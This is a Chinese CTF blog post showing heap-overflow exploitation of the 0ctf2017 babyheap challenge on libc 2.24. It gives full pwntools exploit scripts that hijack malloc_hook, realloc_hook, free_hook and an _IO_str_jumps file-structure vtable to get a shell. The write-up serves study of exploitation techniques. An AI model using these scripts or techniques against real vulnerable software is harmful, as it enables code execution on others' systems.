@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<title>
+  
+    堆溢出的六种利用手法
+  
+</title>
+
+<meta name="description" content="前言忙恶心的工程实训，还耽误校招，只能说学校zz。上次参加网鼎杯线下赛因为利用手法单一，libc版本太老无法本地调试且，one_gadget失效被打爆。痛定思痛，回顾学习以下堆利用能够使用的常见方法。使用程序为0ctf2017的babyheap程序，libc为2.24版本。">
+<meta name="keywords" content="CTF,堆">
+<meta property="og:type" content="article">
+<meta property="og:title" content="堆溢出的六种利用手法">
+<meta property="og:url" content="http://yoursite.com/2018/09/11/堆溢出的六种利用手法/index.html">
+<meta property="og:site_name" content="pwndog&#39;s blog">
+<meta property="og:description" content="前言忙恶心的工程实训，还耽误校招，只能说学校zz。上次参加网鼎杯线下赛因为利用手法单一，libc版本太老无法本地调试且，one_gadget失效被打爆。痛定思痛，回顾学习以下堆利用能够使用的常见方法。使用程序为0ctf2017的babyheap程序，libc为2.24版本。">
+<meta property="og:locale" content="CN">
+<meta property="og:image" content="http://yoursite.com/2018/09/11/堆溢出的六种利用手法/8.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/11/堆溢出的六种利用手法/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/11/堆溢出的六种利用手法/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/11/堆溢出的六种利用手法/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/11/堆溢出的六种利用手法/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/11/堆溢出的六种利用手法/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/11/堆溢出的六种利用手法/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/11/堆溢出的六种利用手法/7.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/11/堆溢出的六种利用手法/9.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/11/堆溢出的六种利用手法/10.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/11/堆溢出的六种利用手法/11.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/11/堆溢出的六种利用手法/12.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/11/堆溢出的六种利用手法/13.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/11/堆溢出的六种利用手法/14.png">
+<meta property="og:updated_time" content="2018-09-11T15:26:29.056Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="堆溢出的六种利用手法">
+<meta name="twitter:description" content="前言忙恶心的工程实训，还耽误校招，只能说学校zz。上次参加网鼎杯线下赛因为利用手法单一，libc版本太老无法本地调试且，one_gadget失效被打爆。痛定思痛，回顾学习以下堆利用能够使用的常见方法。使用程序为0ctf2017的babyheap程序，libc为2.24版本。">
+<meta name="twitter:image" content="http://yoursite.com/2018/09/11/堆溢出的六种利用手法/8.png">
+
+
+  <link rel="alternative" href="/atom.xml" title="pwndog&#39;s blog" type="application/atom+xml">
+
+
+
+  <link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="/perfect-scrollbar/css/perfect-scrollbar.min.css">
+<link rel="stylesheet" href="/styles/main.css">
+
+
+
+
+
+
+</head>
+<body
+  
+    class="monochrome"
+  
+  >
+  <div class="mobile-header">
+  <button class="sidebar-toggle" type="button">
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+  </button>
+  <a class="title" href="/">pwndog&#39;s blog</a>
+</div>
+
+  <div class="main-container">
+    <div class="sidebar">
+  <div class="header">
+    <h1 class="title"><a href="/">pwndog&#39;s blog</a></h1>
+    
+      <p class="subtitle">
+        welcome
+      </p>
+    
+    <div class="info">
+      <div class="content">
+        
+          <div class="description">qq1015138407</div>
+        
+        
+          <div class="author">zzm</div>
+        
+      </div>
+      
+        <div class="avatar">
+          
+            <a href="/about"><img src="https://cn.gravatar.com/avatar/35fef74d731255cd569c2c2b0b9e87e4?s=200"></a>
+          
+        </div>
+      
+    </div>
+  </div>
+  <div class="body">
+    
+      
+        <ul class="nav">
+          
+            
+              <li class="category-list-container">
+                <a href="javascript:;">Category</a>
+                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/glibc源码阅读/">glibc源码阅读</a><span class="category-list-count">1</span></li></ul>
+              </li>
+            
+          
+            
+              <li class="tag-list-container">
+                <a href="javascript:;">Tag</a>
+                <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a><span class="tag-list-count">12</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GLIBC/">GLIBC</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆/">堆</a><span class="tag-list-count">3</span></li></ul>
+              </li>
+            
+          
+            
+              <li class="archive-list-container">
+                <a href="javascript:;">Archive</a>
+                <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">15</span></li></ul>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="/" title="Homepage">Homepage</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/archives" title="By Year">By Year</a>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="https://github.com/denjones/hexo-theme-chan" title="Chan" target="_blank" rel="noopener">Chan</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="https://github.com/denjones" title="Github" target="_blank" rel="noopener">Github</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/atom.xml" title="RSS">RSS</a>
+              </li>
+            
+          
+        </ul>
+      
+    
+  </div>
+</div>
+
+    <div class="main-content">
+      
+        <div style="max-width: 1000px">
+      
+          <article id="post-堆溢出的六种利用手法" class="article article-type-post">
+  
+    <h1 class="article-header">
+      堆溢出的六种利用手法
+    </h1>
+  
+  
+
+  <div class="article-info">
+    <span class="article-date">
+  2018-09-11
+</span>
+
+    
+
+    
+	<span class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/堆/">堆</a></li></ul>
+	</span>
+
+
+  </div>
+  <div class="article-entry">
+    <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>忙恶心的工程实训，还耽误校招，只能说学校zz。<br>上次参加网鼎杯线下赛因为利用手法单一，libc版本太老无法本地调试且，one_gadget失效被打爆。<br>痛定思痛，回顾学习以下堆利用能够使用的常见方法。使用程序为0ctf2017的babyheap程序，libc为2.24版本。<br><a id="more"></a></p>
+<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><h4 id="程序保护"><a href="#程序保护" class="headerlink" title="程序保护"></a>程序保护</h4><p><img src="/2018/09/11/堆溢出的六种利用手法/8.png" alt=""><br>程序开启了全保护。</p>
+<h4 id="程序功能"><a href="#程序功能" class="headerlink" title="程序功能"></a>程序功能</h4><p><img src="/2018/09/11/堆溢出的六种利用手法/1.png" alt=""><br>完整菜单，有alloc，fill，show，free功能。<br><img src="/2018/09/11/堆溢出的六种利用手法/2.png" alt=""><br>alloc功能，可以申请16个大小不大于4096字节的堆块。<br>使用calloc分配。<br><img src="/2018/09/11/堆溢出的六种利用手法/3.png" alt=""><br>fill功能，存在明显漏洞点，可进行任意字节的输入。堆溢出<br><img src="/2018/09/11/堆溢出的六种利用手法/4.png" alt=""><br>free功能，free指定索引堆，并清除悬挂指针无漏洞。<br><img src="/2018/09/11/堆溢出的六种利用手法/5.png" alt=""><br>show功能，使用write函数输出，不用考虑0字节截断问题。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>堆漏洞利用的原因大部分都出在能够对free后的堆块进行写入，程序存在明显的堆溢出漏洞。堆溢出可以造成很多的问题，此题可以直接溢出向之后free状态的堆块进行写入会带来无穷无尽的安全问题。<br>通过堆溢出我们可以实现多种多样的利用手法。</p>
+<h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><p>程序使用calloc进行堆的分配。calloc同malloc类似只是会将申请到的堆块内容清0。所以常规的unsorted bin信息泄露的方式不可行。需要使用堆溢出进行配合<br>程序使用calloc进行堆的分配，<br><img src="/2018/09/11/堆溢出的六种利用手法/6.png" alt=""><br><img src="/2018/09/11/堆溢出的六种利用手法/7.png" alt=""><br>之后free堆块2，再申请一个0x60大小的堆块就可以通过show堆块3来泄露出libc的地址<br><img src="/2018/09/11/堆溢出的六种利用手法/9.png" alt=""></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h4><p>最常见也是最容易的一种堆利用方法。<br>malloc函数会首先检查malloc_hook的值，若不为0则会调用他。若我们能通过内存写入malloc_hook即可实现任意地址跳转<br>通过fastbin_attack攻击malloc_hook。首先观察malloc_hook上方数据<br><img src="/2018/09/11/堆溢出的六种利用手法/10.png" alt=""><br>fastbin在分配时并不检查对齐情况，将fastbin的fd设置为__malloc_hook-0x23，触发fastbin attack分配得到malloc_hook上方内存空间，向malloc_hook进行写入one_gadget得到权限。<br>脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./0ctf111'</span>)</span><br><span class="line">e=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.24.so'</span>)</span><br><span class="line"></span><br><span class="line">p.readuntil(<span class="string">'Command:'</span>)</span><br><span class="line">context(log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(a)</span>:</span></span><br><span class="line">	p.writeline(<span class="string">'1'</span>)</span><br><span class="line">	p.readuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.writeline(str(a))</span><br><span class="line">	p.readuntil(<span class="string">'Command:'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line">	p.writeline(<span class="string">'2'</span>)</span><br><span class="line">	p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.writeline(str(a))</span><br><span class="line">	p.readuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.writeline(str(b))</span><br><span class="line">	p.readuntil(<span class="string">'Content:'</span>)</span><br><span class="line">	p.write(c)</span><br><span class="line">	p.readuntil(<span class="string">'Command:'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(a)</span>:</span>	</span><br><span class="line">	p.writeline(<span class="string">'3'</span>)	</span><br><span class="line">	p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.writeline(str(a))</span><br><span class="line">	p.readuntil(<span class="string">'Command:'</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">96</span>+p64(<span class="number">0x00</span>)+chr(<span class="number">0xe1</span>)</span><br><span class="line">update(<span class="number">2</span>,len(payload),payload)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">p.writeline(<span class="string">'4'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.writeline(<span class="string">'4'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">libc=u64(p.read(<span class="number">6</span>)+chr(<span class="number">0</span>)*<span class="number">2</span>)<span class="number">-0x398B58</span></span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line"></span><br><span class="line">sys=libc+e.symbols[<span class="string">'system'</span>]</span><br><span class="line">re_hook=libc+e.symbols[<span class="string">'__realloc_hook'</span>]</span><br><span class="line">mac_hook=libc+e.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc=libc+e.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">io_list=libc+e.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">jump_table_addr = libc + e.symbols[<span class="string">'_IO_file_jumps'</span>] + <span class="number">0xc0</span></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#6</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">payload=p64(mac_hook<span class="number">-0x23</span>)</span><br><span class="line">update(<span class="number">6</span>,len(payload),payload)</span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#7</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x13</span>+p64(libc+<span class="number">0x3f33a</span>) //malloc_hook</span><br><span class="line"><span class="comment">#payload='a'*0xb+p64(libc+0x3f33a)+p64(realloc+2)</span></span><br><span class="line">update(<span class="number">7</span>,len(payload),payload)</span><br><span class="line">success(hex(mac_hook))</span><br><span class="line">success(hex(realloc))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h4 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="realloc_hook"></a>realloc_hook</h4><p>一种很巧妙的利用方法。有些情况下one_gadget因为环境原因全部都不可用，这时可以通过realloc_hook来调整堆栈环境使one_gadget可用。<br>realloc函数在函数起始会检查realloc_hook的值是否为0，不为0则跳转至realloc_hook指向地址。<br>realloc_hook同malloc_hook相邻，故可通过fastbin attack一同修改两个值。<br>观察一下realloc_hook值不为0时realloc函数过程。<br><img src="/2018/09/11/堆溢出的六种利用手法/11.png" alt=""><br><img src="/2018/09/11/堆溢出的六种利用手法/12.png" alt=""><br>流程为push寄存器，最后全部pop出来跳转至realloc_hook的值。<br>将realloc_hook设置为选择好的one_gadget，将malloc_hook设置为realloc函数开头某一push寄存器处。push和pop的次数是一致的，若push次数减少则会压低堆栈，改变栈环境。这时one_gadget就会可以使用。具体要压低栈多少要根据环境决定，这里我们可以进行小于48字节内或72字节的堆栈调整。</p>
+<p>脚本：开始的函数一致。不再重复<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">96</span>+p64(<span class="number">0x00</span>)+chr(<span class="number">0xe1</span>)</span><br><span class="line">update(<span class="number">2</span>,len(payload),payload)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">p.writeline(<span class="string">'4'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.writeline(<span class="string">'4'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">libc=u64(p.read(<span class="number">6</span>)+chr(<span class="number">0</span>)*<span class="number">2</span>)<span class="number">-0x398B58</span></span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line"></span><br><span class="line">sys=libc+e.symbols[<span class="string">'system'</span>]</span><br><span class="line">re_hook=libc+e.symbols[<span class="string">'__realloc_hook'</span>]</span><br><span class="line">mac_hook=libc+e.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc=libc+e.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">io_list=libc+e.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">jump_table_addr = libc + e.symbols[<span class="string">'_IO_file_jumps'</span>] + <span class="number">0xc0</span></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">payload=p64(mac_hook<span class="number">-0x23</span>)</span><br><span class="line">update(<span class="number">6</span>,len(payload),payload)</span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#7</span></span><br><span class="line"><span class="comment">#payload='a'*0x13+p64(libc+0x3f33a) //malloc_hook</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0xb</span>+p64(libc+<span class="number">0x3f33a</span>)+p64(realloc+<span class="number">2</span>)</span><br><span class="line">update(<span class="number">7</span>,len(payload),payload)</span><br><span class="line">success(hex(mac_hook))</span><br><span class="line">success(hex(realloc))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h4 id="free-hook"><a href="#free-hook" class="headerlink" title="free_hook"></a>free_hook</h4><p>同malloc_hook类似，在调用free函数时会先检验free_hook的值。<br>但是free_hook上方都是0字节。不能直接通过fastbin_attack进行攻击，可以通过修改top<br>free_hook上方，之后申请内存至free_hook修改为system地址。<br>fastbin数组在top chunk指针上方。可以通过free fastbin chunk修改fastbin数组的值使的fastbin attack可以实现。 存在限制要求堆的地址以0x56开头<br><img src="/2018/09/11/堆溢出的六种利用手法/13.png" alt=""><br>脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x40</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x40</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x40</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x40</span>) <span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x40</span>) <span class="comment">#4</span></span><br><span class="line">alloc(<span class="number">0x40</span>) <span class="comment">#5</span></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">64</span>+p64(<span class="number">0x00</span>)+chr(<span class="number">0xa1</span>)</span><br><span class="line">payl=<span class="string">'/bin/sh'</span>+chr(<span class="number">0</span>)</span><br><span class="line">update(<span class="number">0</span>,len(payl),payl)</span><br><span class="line">update(<span class="number">2</span>,len(payload),payload)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">alloc(<span class="number">0x40</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">p.writeline(<span class="string">'4'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.writeline(<span class="string">'4'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">libc=u64(p.read(<span class="number">6</span>)+chr(<span class="number">0</span>)*<span class="number">2</span>)<span class="number">-0x398B58</span></span><br><span class="line">free_hook=libc+e.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line">alloc(<span class="number">0x40</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">payload=p64(libc+<span class="number">0x398B35</span><span class="number">-0x8</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">4</span>,len(payload),payload)</span><br><span class="line">alloc(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">success(hex(libc+<span class="number">0x398B35</span><span class="number">-0x8</span>))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x40</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x1b</span>+p64(free_hook<span class="number">-0xb58</span>)+<span class="string">'aaa'</span></span><br><span class="line">update(<span class="number">8</span>,len(payload),payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">	alloc(<span class="number">0x200</span>)</span><br><span class="line">system=libc+e.symbols[<span class="string">'system'</span>]</span><br><span class="line">payload=chr(<span class="number">0</span>)*<span class="number">0xf8</span>+p64(system)</span><br><span class="line">update(<span class="number">14</span>,len(payload),payload)</span><br><span class="line">success(hex(libc+<span class="number">0x398B00</span>))</span><br><span class="line">success(hex(free_hook))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h4 id="利用io-overflow"><a href="#利用io-overflow" class="headerlink" title="利用io_overflow"></a>利用io_overflow</h4><p>house of orange的升级版本，在libc2.24以上的版本，对于文件结构的虚表存在限制，不能像之前一样修改虚表为堆地址实现。<br>但是可以借助已经存在的虚表<strong>IO_str_jumps<br>结构如下<br>const struct _IO_jump_t _IO_str_jumps libio_vtable =<br>{<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_str_finish),<br>  JUMP_INIT(overflow, _IO_str_overflow),<br>  JUMP_INIT(underflow, _IO_str_underflow),<br>  JUMP_INIT(uflow, _IO_default_uflow),<br>  JUMP_INIT(pbackfail, _IO_str_pbackfail),<br>  JUMP_INIT(xsputn, _IO_default_xsputn),<br>  JUMP_INIT(xsgetn, _IO_default_xsgetn),<br>  JUMP_INIT(seekoff, _IO_str_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_default_setbuf),<br>  JUMP_INIT(sync, _IO_default_sync),<br>  JUMP_INIT(doallocate, _IO_default_doallocate),<br>  JUMP_INIT(read, _IO_default_read),<br>  JUMP_INIT(write, _IO_default_write),<br>  JUMP_INIT(seek, _IO_default_seek),<br>  JUMP_INIT(close, _IO_default_close),<br>  JUMP_INIT(stat, _IO_default_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>};<br>其中_IO_str_overflow函数会调用文件对象fd+0xe0处的地址。<br>在house of orange的基础上进行更新，将虚表地址设置为</strong>IO_str_jumps地址，fd+0xe0设置为one_gadget即可完成利用。<br>脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#4</span></span><br><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#5</span></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x90</span>+p64(<span class="number">0x00</span>)+p64(<span class="number">0x141</span>)</span><br><span class="line">payl=<span class="string">'/bin/sh'</span>+chr(<span class="number">0</span>)</span><br><span class="line">update(<span class="number">0</span>,len(payl),payl)</span><br><span class="line">update(<span class="number">2</span>,len(payload),payload)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">alloc(<span class="number">0x90</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">p.writeline(<span class="string">'4'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.writeline(<span class="string">'4'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">libc=u64(p.read(<span class="number">6</span>)+chr(<span class="number">0</span>)*<span class="number">2</span>)<span class="number">-0x398B58</span></span><br><span class="line">io_list_all_addr = libc + e.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">jump_table_addr = libc + e.symbols[<span class="string">'_IO_file_jumps'</span>] + <span class="number">0xc0</span></span><br><span class="line">file_struct=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(libc)+p64(io_list_all_addr - <span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line">file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">file_struct += p64(jump_table_addr)</span><br><span class="line">file_struct += p64(libc + <span class="number">0x3f33a</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x90</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x90</span>+file_struct</span><br><span class="line">update(<span class="number">3</span>,len(payload),payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
